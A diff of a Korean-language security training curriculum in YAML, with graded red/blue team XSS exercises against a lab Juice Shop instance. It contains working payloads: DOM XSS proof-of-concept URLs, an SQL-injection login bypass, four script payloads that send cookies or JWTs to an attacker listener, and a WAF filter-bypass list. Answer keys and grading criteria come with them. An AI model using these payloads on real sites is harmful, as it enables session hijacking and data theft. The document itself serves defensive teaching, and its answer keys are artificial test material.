+    / document.URL / postMessage 등의 입력을 innerHTML / eval / document.write 같은
+    *sink* 에 넣을 때 trigger. Juice Shop 의 main XSS challenge = `/#/search?q=`
+    의 Angular 의 trust pipe 사용 (의도된 challenge).
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `session` 에 적합한 도구: curl -c cookie.jar -b cookie.jar,
-    jwt_tool. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 세션 토큰 엔트로피 분석 관련 도구와 기법을 활용하세요.
-  category: session
+    ## 💻 실행 명령
+
+    ```bash
+    # 1. Juice Shop 의 JS 번들 download + DOM sink grep
+    echo "=== 1. JS 번들 의 DOM sink (innerHTML/eval/document.write) ==="
+    curl -s http://juice.6v6.lab/main-es2018.js 2>/dev/null | head -c 1 > /dev/null || \
+      MAIN_JS=$(curl -s http://juice.6v6.lab/ | grep -oE 'main\.js' | head -1)
+    [ -z "$MAIN_JS" ] && MAIN_JS=$(curl -s http://juice.6v6.lab/ | grep -oE 'main-[a-z0-9]+\.js' | head -1)
+    echo "main JS: ${MAIN_JS}"
+    curl -s "http://juice.6v6.lab/${MAIN_JS}" 2>/dev/null \
+      | grep -ioE '(innerHTML|outerHTML|document\.write|eval\(|bypassSecurityTrust[A-Za-z]+|setHTML)' \
+      | sort | uniq -c | sort -rn | head -10
+
+    # 2. /#/search?q=<iframe> DOM XSS PoC (Angular hash route)
+    # 브라우저 직접 시도 (curl 로는 client JS 실행 안 됨)
+    echo ""
+    echo "=== 2. DOM XSS PoC (browser 직접 시도) ==="
+    cat <<'EOF'
+    브라우저 URL bar 에 입력:
+      http://juice.6v6.lab/#/search?q=<iframe%20src=%22javascript:alert(`xss`)%22>
+      http://juice.6v6.lab/#/search?q=<img%20src=x%20onerror=alert(1)>
+
+    Juice Shop /#/search 의 Angular component (SearchResultComponent) 가
+    `searchValue` 를 `bypassSecurityTrustHtml()` 통해 mat-card-title 의
+    innerHTML 로 사용 → 의도된 challenge.
+    EOF
+
+    # 3. server 응답에 q 반사 0 = DOM 만 trigger 인지 확인 (step 1 결과 재인용)
+    echo ""
+    echo "=== 3. server 응답 본문 의 q 반사 확인 (재검증) ==="
+    grep_count=$(curl -s "http://juice.6v6.lab/#/search?q=DOMTESTXYZ" | grep -c "DOMTESTXYZ")
+    echo "server 응답 의 q 반사 횟수: ${grep_count} (0 = DOM 만 trigger 가능)"
+    ```
+
+    ## 📋 확인 사항
+
+    - JS 번들 의 sink (innerHTML / outerHTML / eval / document.write /
+      bypassSecurityTrustHtml) 의 *호출 횟수* + Angular 의 trust pipe 사용 여부
+    - server 응답 의 q 반사 = 0 → DOM 만 trigger (Reflected 아님)
+    - 브라우저 시도 시 `/#/search?q=<iframe...>` 의 popup alert 발생 (DOM XSS challenge 성공)
+    - Angular 의 *security context bypass* (`bypassSecurityTrustHtml`) = Juice Shop
+      의 의도된 취약점
+
+    ## 💡 왜 이걸 하는가?
+
+    Modern SPA (Angular / React / Vue) 의 *main XSS vector* 는 DOM-based —
+    server 응답이 sanitize 되어도 client JS 의 sink 가 *bypass* 가능. OWASP
+    A03 + MITRE T1059.007. Angular 의 `bypassSecurityTrust*` API 는 *완전한
+    위험* (의도적 사용 금지) — Juice Shop 의 default challenge 가 정확히 이것.
+
+    ## 🔵 Blue 측 작업
+
+    DOM XSS 는 *server-side log 에 흔적 없음* (페이로드가 hash fragment, 서버 안
+    옴) → 별도 client-side telemetry 필요:
+    - **CSP Report-URI** — CSP 위반 시 server 에 report POST → Wazuh
+    - **JS error monitoring** (Sentry / Rollbar) — XSS payload 의 비정상 호출 감지
+    - **SAST**: Semgrep 의 `javascript.express.security.audit.xss` rule
+
+    ## 🟣 Purple 권고
+
+    - **Angular**: `[innerHTML]` 사용 금지 (default escape 사용), `bypassSecurityTrust*`
+      절대 금지
+    - **DOMPurify**: client-side 의 모든 user input 을 `DOMPurify.sanitize()` 통과
+    - **CSP**: `script-src 'self'` + `default-src 'self'` (inline 차단 — Angular
+      의 inline event handler 도 차단됨)
+    - **CSP Report-Only** 단계 도입: 정책 위반만 report → 1 개월 모니터링 → enforce
+  hint: |
+    Juice Shop main JS 번들 의 DOM sink grep + 브라우저 직접 시도 (DOM XSS 는 curl
+    만으로 trigger 안 됨). server 응답 본문 의 q 반사 0 = DOM 만 vector 확인.
+  category: xss_dom
   points: 10
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 세션 토큰 엔트로피 분석을(를) 수행해줘\n\U0001F4CE 참고\
-    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 토큰 엔트로피\
-    \ 분석 완료'"
-  answer_detail: 세션 토큰 엔트로피 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  answer: |
+    echo "=== 1. JS 번들 의 DOM sink ==="
+    MAIN_JS=$(curl -s http://juice.6v6.lab/ | grep -oE 'main-[a-zA-Z0-9._-]+\.js|main\.js' | head -1)
+    echo "main JS: ${MAIN_JS}"
+    curl -s "http://juice.6v6.lab/${MAIN_JS}" 2>/dev/null \
+      | grep -ioE '(innerHTML|outerHTML|document\.write|eval\(|bypassSecurityTrust[A-Za-z]+|setHTML)' \
+      | sort | uniq -c | sort -rn | head -10
+    echo ""
+    echo "=== 2. server 응답 의 q 반사 확인 ==="
+    grep_count=$(curl -s "http://juice.6v6.lab/#/search?q=DOMTESTXYZ" | grep -c "DOMTESTXYZ")
+    echo "server 응답 의 q 반사: ${grep_count} (0 = DOM only)"
+    echo ""
+    echo "=== 3. 브라우저 PoC URL ==="
+    echo "  http://juice.6v6.lab/#/search?q=<iframe%20src=javascript:alert(1)>"
+    echo "  → Angular bypassSecurityTrustHtml 의 innerHTML sink → alert 실행"
+  answer_detail: |
+    Juice Shop main JS 번들 의 `innerHTML` / `bypassSecurityTrustHtml` 호출 다수.
+    Angular 의 SearchResultComponent 가 location.hash 의 q 를 *trust pipe* 통해
+    mat-card-title 의 innerHTML 로 사용 → DOM XSS 의도 challenge. server 응답
+    body 에 q 반사 0 = 순수 DOM only XSS. 브라우저 직접 시도 + DevTools 의
+    Source 탭에서 sink 의 stack trace 추적 가능.
   verify:
     type: output_contains
-    expect: 완료
+    expect: 'main\|sink\|DOM'
     field: stdout
     semantic:
-      intent: 세션 토큰 엔트로피 분석 — 여러 토큰 수집 후 길이·charset·변이 관찰, Burp Sequencer 로 랜덤성 검증
+      intent: |
+        DOM-based XSS — Angular SPA 의 trust pipe (bypassSecurityTrustHtml) +
+        innerHTML sink 의 직접 시도. server 응답에 흔적 없음 → client-side 만
+        trigger. OWASP A03 + MITRE T1059.007.
       success_criteria:
-      - 최소 5개 세션 토큰 수집
-      - 길이·charset(hex/base64) 일관성 확인
-      - 추측 가능성(증가형 vs 랜덤) 판정
+        - JS 번들 의 DOM sink (innerHTML / eval / bypassSecurityTrust 등) grep
+        - server 응답 의 q 반사 0 확인 (DOM only 인 증거)
+        - 브라우저 PoC URL 제시 (#/search?q=<iframe>)
+        - Angular 의 trust pipe / DOMPurify 권고
       acceptable_methods:
-      - repeat curl -c cookies.txt login 으로 토큰 여러 개 생성
-      - Burp Sequencer 자동 랜덤성 분석
-      - python으로 엔트로피 계산 (math.log2 * len)
-      - dieharder/ent 통계 테스트
+        - "curl + main.js grep DOM sink"
+        - "XSStrike --dom (자동 탐지)"
+        - "Browser DevTools Source + breakpoint 의 sink 추적"
+        - "Semgrep js sast XSS rule"
       negative_signs:
-      - 단일 토큰만 관찰
-      - 랜덤성 평가 없음
-      - 예측 가능성 판정 없음
+        - server reflected 와 혼동
+        - 브라우저 PoC URL 누락
+        - Angular trust pipe / DOMPurify 권고 없음
   target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 토큰 엔트로피\
-    \ 분석 완료'"
+  script: |
+    MAIN_JS=$(curl -s http://juice.6v6.lab/ | grep -oE 'main-[a-zA-Z0-9._-]+\.js|main\.js' | head -1)
+    echo "main JS: ${MAIN_JS}"
+    curl -s "http://juice.6v6.lab/${MAIN_JS}" 2>/dev/null \
+      | grep -ioE '(innerHTML|bypassSecurityTrust[A-Za-z]+|eval\()' \
+      | sort | uniq -c | sort -rn | head -5
+    echo "server 응답 q 반사: $(curl -s 'http://juice.6v6.lab/#/search?q=DOMTESTXYZ' | grep -c DOMTESTXYZ)"
+    echo "브라우저 PoC: http://juice.6v6.lab/#/search?q=<iframe src=javascript:alert(1)>"
   risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 세션 토큰 엔트로피 분석을(를) 수행해줘
-
-
-    [도구 권장] session: curl -c cookie.jar -b cookie.jar, jwt_tool. curl 만 쓰지 말고 **curl
-    -c cookie.jar -b cookie.jar** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    attacker 컨테이너에서 juice.6v6.lab 의 DOM-based XSS 점검 — (1) main JS 번들
+    의 DOM sink grep (innerHTML / bypassSecurityTrust / eval) (2) server 응답 의
+    q 반사 0 확인 (DOM only 증거) (3) 브라우저 PoC URL 제시
+    (#/search?q=<iframe src=javascript:alert(1)>). Angular 의 trust pipe + 의도된
+    challenge 설명. Purple = DOMPurify + Angular [innerHTML] 금지 + CSP script-src
+    'self' + Report-Only 단계 도입.
+# ============================================================
+# STEP 5 [RED·XSS·Exploit] — Cookie 탈취 + JWT exfil + 세션 하이재킹 시나리오
+# ============================================================
 - order: 5
-  instruction: '{{WEB_IP}} 대상으로 세션 고정 공격 테스트을(를) 수행하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    XSS 의 *exploit 단계* — JS 가 실행되면 document.cookie / localStorage / JWT
+    token 외부 exfil. 4 가지 exfil 채널 (Image / fetch / sendBeacon / WebSocket)
+    + Juice Shop 의 JWT 가 어디 저장되는지 확인 + HttpOnly 없는 cookie 의 위험.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `session` 에 적합한 도구: curl -c cookie.jar -b cookie.jar,
-    jwt_tool. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 세션 고정 공격 테스트 관련 도구와 기법을 활용하세요.
-  category: session
+    ## 💻 실행 명령
+
+    ```bash
+    # 1. attacker 컨테이너 에 listener (rogue collector 시뮬) 띄움
+    echo "=== 1. exfil collector listener (port 9999) ==="
+    (nc -lk 9999 2>&1 | head -20 &) 2>/dev/null
+    sleep 1; jobs
+
+    # 2. 4 exfil payload (실 실행은 브라우저 PoC, 여기는 명세 출력)
+    cat <<'EOF'
+    === XSS exfil payload 4 가지 (학습용 PoC) ===
+
+    [a] Image — 가장 stealthy (GET req, log 안남기 X)
+        <script>new Image().src='http://10.20.30.202:9999/?c='+encodeURIComponent(document.cookie)</script>
+
+    [b] fetch — modern API (CORS preflight 무시)
+        <script>fetch('http://10.20.30.202:9999/?c='+document.cookie)</script>
+
+    [c] sendBeacon — page unload 시 보장 전송
+        <script>navigator.sendBeacon('http://10.20.30.202:9999/', document.cookie)</script>
+
+    [d] WebSocket — 양방향 + C2 채널
+        <script>new WebSocket('ws://10.20.30.202:9999/').send(document.cookie)</script>
+    EOF
+
+    # 3. Juice Shop 의 JWT 저장 위치 확인 (cookie? localStorage?)
+    echo ""
+    echo "=== 3. Juice Shop 로그인 응답 헤더 (Set-Cookie 여부) ==="
+    curl -s -i -X POST http://juice.6v6.lab/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}" \
+      | grep -iE '^(set-cookie|content-type):'
+    echo ""
+    echo "(Juice Shop 의 JWT 는 응답 body 에 token 으로 반환 → client 가 localStorage 저장)"
+    echo "→ XSS payload 는 document.cookie 대신 localStorage.getItem('token') 사용:"
+    echo "   <script>new Image().src='http://attacker/?t='+localStorage.getItem('token')</script>"
+
+    # 4. listener 종료
+    pkill -f "nc -lk 9999" 2>/dev/null
+    echo "결론: 4 exfil 채널 + Juice Shop 의 localStorage JWT 탈취 시나리오"
+    ```
+
+    ## 📋 확인 사항
+
+    - Juice Shop 응답에 **Set-Cookie 없음** → JWT 가 localStorage (HttpOnly 무관)
+    - 4 exfil 채널 중 Image 가 가장 stealthy (no CORS, GET only)
+    - HttpOnly cookie + SameSite=Strict 가 cookie 기반 세션의 1 차 방어 (Juice Shop
+      의 localStorage 는 별도 — DOMPurify + CSP 가 방어)
+    - **세션 하이재킹** = 탈취 JWT 로 Authorization header 사용 → admin 권한
+
+    ## 💡 왜 이걸 하는가?
+
+    XSS 의 *최종 목표* = session takeover (admin 권한) + data exfil (MITRE
+    T1539 Steal Web Session Cookie + T1041 Exfiltration Over C2 Channel).
+    Juice Shop 의 localStorage JWT 는 *HttpOnly 무관* → XSS 즉시 token 탈취 +
+    admin 권한 획득. Cookie 기반 세션의 HttpOnly 도 *DOM XSS 의 다른 sink*
+    로 우회 가능 (예: localStorage / IndexedDB).
+
+    ## 🔵 Blue 측 작업
+
+    - **CSP `connect-src 'self'`** — fetch/WebSocket/sendBeacon 의 외부 endpoint
+      차단
+    - **CSP `img-src 'self'`** — Image 의 외부 src 차단 (가장 stealthy exfil 방어)
+    - **Wazuh + Suricata** — outbound traffic 분석 (alert: `cookie=` query string
+      in HTTP request body)
+    - **JS error monitoring** (Sentry) — XSS 실행 시 fetch/Image 호출 패턴 식별
+
+    ## 🟣 Purple 권고
+
+    - **localStorage 사용 금지** → HttpOnly cookie + Secure + SameSite=Strict
+      (Juice Shop 의 architecture 결함)
+    - **CSP `default-src 'self'` strict** — 모든 외부 resource 차단
+    - **Subresource Integrity** (SRI) — 외부 script 무결성 검증
+    - **token rotation** — 매 N 분 token 만료 + refresh (탈취 token 의 lifetime 단축)
+    - Juice Shop default 는 학습용 (HttpOnly 없음, localStorage 사용) — 운영 web 의 정정 필수
+  hint: |
+    Juice Shop 의 JWT 는 localStorage (Set-Cookie 없음) → HttpOnly 무관. 4 exfil
+    채널 (Image / fetch / sendBeacon / WebSocket) + CSP connect-src 가 방어.
+  category: xss_exploit
   points: 10
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 세션 고정 공격 테스트을(를) 수행해줘\n\U0001F4CE 참고\
-    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 고정 공격\
-    \ 테스트 완료'"
-  answer_detail: 세션 고정 공격 테스트은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  answer: |
+    cat <<'EOF'
+    === XSS exfil payload 4 가지 ===
+    [a] Image       : <script>new Image().src='http://attacker/?c='+document.cookie</script>
+    [b] fetch       : <script>fetch('http://attacker/?c='+document.cookie)</script>
+    [c] sendBeacon  : <script>navigator.sendBeacon('http://attacker/', document.cookie)</script>
+    [d] WebSocket   : <script>new WebSocket('ws://attacker/').send(document.cookie)</script>
+    EOF
+
+    echo ""
+    echo "=== Juice Shop 의 JWT 저장 위치 확인 ==="
+    curl -s -i -X POST http://juice.6v6.lab/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}" \
+      | grep -iE '^(set-cookie|content-type):'
+    echo ""
+    echo "(Set-Cookie 없음 → JWT 가 localStorage 저장. HttpOnly 무관)"
+    echo "→ payload: <script>new Image().src='http://attacker/?t='+localStorage.getItem('token')</script>"
+    echo "결론: 4 exfil 채널 + Juice Shop localStorage JWT 탈취 = admin session takeover"
+  answer_detail: |
+    Juice Shop 응답에 Set-Cookie 없음 → JWT 가 localStorage 저장 (Angular SPA 의
+    pattern). XSS 가 실행되면 localStorage.getItem('token') 즉시 추출 → Authorization
+    header 로 admin 권한 takeover. HttpOnly cookie 권장 + CSP connect-src strict 가
+    exfil 채널 4 모두 차단.
   verify:
     type: output_contains
-    expect: 완료
+    expect: 'exfil\|payload\|결론'
     field: stdout
     semantic:
-      intent: 세션 고정(Session Fixation) — 로그인 전 제공한 세션 ID 가 로그인 후에도 유지되는지 검증 (재생성 안하면
-        취약)
+      intent: |
+        XSS exploit 단계 — 4 exfil 채널 (Image/fetch/sendBeacon/WebSocket) + JWT
+        탈취 + session takeover. MITRE T1539 + T1041. CSP connect-src 가 1 차 방어.
       success_criteria:
-      - 미인증 상태 세션 쿠키 획득
-      - 해당 쿠키 지참 로그인 후 세션 ID 변경 여부 확인
-      - 변경되지 않으면 Session Fixation 취약 판정
+        - 4 exfil 채널 중 최소 2 가지 payload 명시
+        - Juice Shop 의 JWT 저장 위치 (localStorage vs Cookie) 확인
+        - HttpOnly + CSP connect-src 권고
+        - 세션 하이재킹 시나리오 (탈취 token → admin) 설명
       acceptable_methods:
-      - curl -c cookies.txt <login_page> 후 -b cookies.txt 로 로그인
-      - Burp Repeater 로 쿠키 비교
-      - python requests session 으로 로그인 전후 비교
-      - OWASP Testing Guide WSTG-SESS-03 참조
+        - "new Image().src 또는 fetch 의 exfil PoC"
+        - "BeEF framework (XSS hook)"
+        - "XSSHunter 무료 서비스"
+        - "Burp Collaborator 의 OOB exfil"
       negative_signs:
-      - 쿠키 비교 없음
-      - 로그인 전후 동일 여부 판정 누락
-      - 세션 재생성 권고 없음
+        - exfil 채널 1 가지만
+        - JWT 저장 위치 확인 누락
+        - HttpOnly / CSP 권고 누락
   target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 고정 공격\
-    \ 테스트 완료'"
+  script: |
+    cat <<'EOF'
+    === XSS exfil 4 채널 ===
+    [a] Image new Image().src='http://attacker/?c='+document.cookie
+    [b] fetch('http://attacker/?c='+document.cookie)
+    [c] navigator.sendBeacon('http://attacker/', document.cookie)
+    [d] new WebSocket('ws://attacker/').send(document.cookie)
+    EOF
+    curl -s -i -X POST http://juice.6v6.lab/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}" \
+      | grep -iE '^(set-cookie|content-type):'
+    echo "결론: Juice Shop localStorage JWT 탈취 = admin session takeover"
   risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 세션 고정 공격 테스트을(를) 수행해줘
-
-
-    [도구 권장] session: curl -c cookie.jar -b cookie.jar, jwt_tool. curl 만 쓰지 말고 **curl
-    -c cookie.jar -b cookie.jar** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    attacker 컨테이너에서 XSS 의 exploit 단계 — 4 exfil 채널 (Image / fetch /
+    sendBeacon / WebSocket) PoC + Juice Shop 의 JWT 저장 위치 확인 (Set-Cookie
+    없음 = localStorage). 세션 하이재킹 시나리오 (탈취 JWT → Authorization →
+    admin). MITRE T1539 + T1041. Purple = HttpOnly cookie + CSP connect-src
+    + SRI + token rotation.
+# ============================================================
+# STEP 6 [RED·XSS·Bypass] — 필터 우회 7 기법 (encoding / case / fragment / SVG)
+# ============================================================
 - order: 6
-  instruction: '{{WEB_IP}} 대상으로 세션 하이재킹 시뮬레이션을(를) 수행하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    WAF / sanitizer 의 블랙리스트 (단순 `<script>` grep) 우회 7 기법 시연:
+    encoding (URL / HTML entity / Unicode) + case 혼합 + tag fragment (`<svg/>`)
+    + JS context (template literal / unicode escape) + protocol (data: / javascript:).
+    각 기법의 ModSecurity 차단 vs 우회 결과 확인.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `session` 에 적합한 도구: curl -c cookie.jar -b cookie.jar,
-    jwt_tool. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 세션 하이재킹 시뮬레이션 관련 도구와 기법을 활용하세요.
-  category: session
+    ## 💻 실행 명령
+
+    ```bash
+    # 7 우회 payload (모두 alert(1) 시도 — 의미는 동일, encoding 만 다름)
+    for label_payload in \
+      "1-plain:<script>alert(1)</script>" \
+      "2-case:<ScRiPt>alert(1)</sCrIpT>" \
+      "3-url:%3Cscript%3Ealert(1)%3C/script%3E" \
+      "4-html_entity:&#60;script&#62;alert(1)&#60;/script&#62;" \
+      "5-double_url:%253Cscript%253E" \
+      "6-svg_fragment:<svg/onload=alert(1)>" \
+      "7-template:<script>\`\${alert(1)}\`</script>" \
+      ; do
+      label=$(echo "$label_payload" | cut -d: -f1)
+      payload=$(echo "$label_payload" | cut -d: -f2-)
+      code=$(curl -o /dev/null -s -w "%{http_code}" -G --data-urlencode "q=apple${payload}" \
+        http://juice.6v6.lab/rest/products/search)
+      echo "${label}: code=${code}"
+    done
+
+    # ModSec audit log 의 매치 차이 확인 (선택)
+    echo ""
+    echo "=== ModSec rule 매치 통계 (DetectionOnly 모드) ==="
+    echo "ssh 6v6-bastion 'sudo docker exec 6v6-web bash -c \"tail -200 /var/log/apache2/modsec_audit.log | grep -oE \\\"\\\\\\\"ruleId\\\\\\\":\\\\\\\"[0-9]+\\\\\\\"\\\" | sort | uniq -c | sort -rn | head\"'"
+    ```
+
+    ## 📋 확인 사항 (우회 기법 표)
+
+    | 기법 | payload 예 | 차단 가능성 | 비고 |
+    |------|-----------|-----------|------|
+    | 1 plain | `<script>` | high (CRS 941100) | baseline |
+    | 2 case | `<ScRiPt>` | high (CRS 의 regex 대소문자 무관) | regex 무력화 시도 |
+    | 3 URL encoded | `%3Cscript%3E` | high (WAF 가 decode 후 inspect) | naive WAF 우회 |
+    | 4 HTML entity | `&#60;script&#62;` | medium (server decode 의존) | 일부 우회 |
+    | 5 double URL | `%253Cscript%253E` | low (WAF 가 single decode 만) | layer 의존 우회 |
+    | 6 SVG fragment | `<svg/onload=>` | medium (CRS 941160) | script 외 tag |
+    | 7 template literal | `${alert(1)}` | low (JS context, HTML grep 우회) | DOM XSS only |
+
+    ## 💡 왜 이걸 하는가?
+
+    *블랙리스트 필터의 본질적 한계* — payload 변형 무한 가능. WAF 의 PARANOIA
+    LEVEL 1 (default) 은 단순 패턴만 차단 → 위 7 기법 중 4-5 우회 가능.
+    OWASP A03 + MITRE T1027 Obfuscated Files or Information.
+
+    *whitelist 기반 sanitizer* (DOMPurify) 가 정답 — 허용 tag/attribute 명시
+    후 모두 strip. blacklist (CRS 의 942/941 룰) 는 *추가 layer* 만.
+
+    ## 🔵 Blue 측 작업
+
+    - **PARANOIA LEVEL 단계 상승**: 1 (default) → 2 → 3 → 4. 각 단계 1 개월
+      FP 모니터링 후 enforce
+    - **modsec_audit.log 의 ruleId 매치 통계** — 어떤 패턴이 차단되고 어떤
+      패턴이 통과하는지 식별 (위 7 기법 중 통과한 것 = WAF 의 blind spot)
+    - **custom rule 추가** — 자체 app 의 특수 패턴 (예: `bypassSecurityTrustHtml`
+      키워드) 차단
+
+    ## 🟣 Purple 권고
+
+    - **whitelist sanitize** (DOMPurify / sanitize-html) 가 1 차 — WAF 는 보조
+    - **CSP `script-src 'self'`** + nonce (step 9 의 본격)
+    - **defense in depth** — sanitize + CSP + HttpOnly + ModSec PL 2-3 + DAST CI
+  hint: |
+    7 우회 기법 for-loop 시도 + 응답 코드 비교. ModSec DetectionOnly 라 모두
+    200 (LIKE empty data). 진짜 차단 측정은 audit log 의 ruleId 통계.
+  category: xss_bypass
   points: 12
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 세션 하이재킹 시뮬레이션을(를) 수행해줘\n\U0001F4CE 참고\
-    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 하이재킹\
-    \ 시뮬레이션 완료'"
-  answer_detail: 세션 하이재킹 시뮬레이션은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  answer: |
+    for p in "1-plain:<script>alert(1)</script>" \
+             "2-case:<ScRiPt>alert(1)</sCrIpT>" \
+             "3-url:%3Cscript%3E" \
+             "4-html_entity:&#60;script&#62;" \
+             "5-double_url:%253Cscript%253E" \
+             "6-svg_fragment:<svg/onload=alert(1)>" \
+             "7-template:<script>\${alert(1)}</script>"; do
+      label=$(echo "$p" | cut -d: -f1)
+      payload=$(echo "$p" | cut -d: -f2-)
+      code=$(curl -o /dev/null -s -w "%{http_code}" -G --data-urlencode "q=apple${payload}" \
+        http://juice.6v6.lab/rest/products/search)
+      echo "${label}: code=${code}"
+    done
+    echo ""
+    echo "결론: blacklist (CRS) 우회 무한 변형 → whitelist (DOMPurify) 가 정답"
+    echo "WAF 는 추가 layer 만, 단일 의존 X"
+  answer_detail: |
+    7 우회 기법 — case / URL encoded / HTML entity / double URL / SVG fragment /
+    template literal. WAF 의 PARANOIA 1 (default) 은 단순 패턴만 차단 → 4-5
+    우회 가능. whitelist 기반 sanitizer (DOMPurify) 가 본질적 방어. WAF 는
+    *추가 layer* — defense in depth 의 한 축.
   verify:
     type: output_contains
-    expect:
-    - 완료
-    - hijack
+    expect: 'code=\|결론'
     field: stdout
     semantic:
-      intent: 세션 하이재킹 시뮬레이션 — 타인의 세션 쿠키 탈취 가정 후 해당 쿠키로 요청해 권한 이관 여부 확인
+      intent: |
+        XSS 필터 우회 7 기법 (encoding/case/fragment/protocol) 시연 + WAF blacklist
+        의 한계 + whitelist sanitizer 권고. OWASP A03 + MITRE T1027.
       success_criteria:
-      - 쿠키 복제 후 curl -b 또는 브라우저 DevTools 로 대체 로그인
-      - 세션 소유자 식별 응답(프로필 페이지 등) 확인
-      - HttpOnly/Secure 누락이 탈취 경로 확장 설명
+        - 최소 5 우회 기법 시도 (case + URL + HTML entity + SVG + 추가)
+        - 각 기법 의 차단 vs 우회 결과 표
+        - whitelist sanitizer (DOMPurify) 권장
+        - defense in depth 명시
       acceptable_methods:
-      - curl -b "session=<hijacked>" <protected_url>
-      - browser cookie editor extension
-      - python requests cookies={...}
-      - BeEF cookie steal module
+        - "curl + 7 payload for-loop"
+        - "dalfox / XSStrike 자동 tamper"
+        - "Burp Intruder 의 payload list"
+        - "ModSec audit log 의 ruleId 통계"
       negative_signs:
-      - 쿠키 재사용 없이 개념만
-      - 권한 이관 확인 없음
-      - HttpOnly/Secure 언급 없음
+        - 우회 기법 2 가지 이하
+        - 결과 비교 누락
+        - whitelist sanitizer 권고 없음
   target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 하이재킹\
-    \ 시뮬레이션 완료'"
+  script: |
+    for p in "case:<ScRiPt>alert(1)</sCrIpT>" "url:%3Cscript%3E" \
+             "html_entity:&#60;script&#62;" "svg:<svg/onload=alert(1)>" \
+             "double_url:%253Cscript%253E"; do
+      label=$(echo "$p" | cut -d: -f1)
+      payload=$(echo "$p" | cut -d: -f2-)
+      code=$(curl -o /dev/null -s -w "%{http_code}" -G --data-urlencode "q=apple${payload}" \
+        http://juice.6v6.lab/rest/products/search)
+      echo "${label}: ${code}"
+    done
+    echo "결론: blacklist 우회 무한 → whitelist (DOMPurify) 가 정답"
   risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 세션 하이재킹 시뮬레이션을(를) 수행해줘
-
-
-    [도구 권장] session: curl -c cookie.jar -b cookie.jar, jwt_tool. curl 만 쓰지 말고 **curl
-    -c cookie.jar -b cookie.jar** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    attacker 컨테이너에서 juice.6v6.lab 의 /rest/products/search?q= 에 XSS 우회
+    7 기법 (case / URL encoded / HTML entity / double URL / SVG fragment /
+    template literal) for-loop 시도 + 응답 코드 비교. WAF blacklist (CRS) 의 한계
+    + whitelist sanitizer (DOMPurify) 가 정답 + WAF 는 추가 layer 만 + defense
+    in depth. OWASP A03 + MITRE T1027.
+# ============================================================
+# STEP 7 [BLUE·XSS·CSP] — CSP 헤더 분석 + 약점 식별 + Strict CSP 권고
+# ============================================================
 - order: 7
-  instruction: '{{WEB_IP}} 대상으로 JWT 토큰 구조 분석을(를) 수행하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    Content-Security-Policy 는 XSS 의 *마지막 방어* — payload 가 실행되더라도
+    *외부 resource 로드 / inline script* 차단. Juice Shop 의 CSP 정책 확인 +
+    약점 (unsafe-inline / wildcard / data: scheme) 식별 + Strict CSP 권고.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `jwt` 에 적합한 도구: jwt_tool (decode/forge/none/alg
-    confusion), curl + Authorization 헤더. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote**
-    해야 채점 통과.'
-  hint: JWT 토큰 구조 분석 관련 도구와 기법을 활용하세요.
-  category: jwt
+    ## 💻 실행 명령
+
+    ```bash
+    # 1. CSP 헤더 수집
+    echo "=== 1. CSP 헤더 ==="
+    CSP=$(curl -sI http://juice.6v6.lab/ | grep -i '^content-security-policy:')
+    echo "${CSP:-'(CSP 미설정 = critical)'}"
+
+    # 2. 다른 보안 헤더 (X-Frame / HSTS / Permissions-Policy) 동시 점검
+    echo ""
+    echo "=== 2. 기타 보안 헤더 (W01 step 4 의 6 헤더 재점검) ==="
+    curl -sI http://juice.6v6.lab/ | grep -iE '^(x-frame|x-content-type|strict-transport|referrer-policy|permissions-policy):'
+
+    # 3. CSP 정책 해석 — 약점 패턴 grep
+    echo ""
+    echo "=== 3. CSP 약점 패턴 분석 ==="
+    if [ -n "$CSP" ]; then
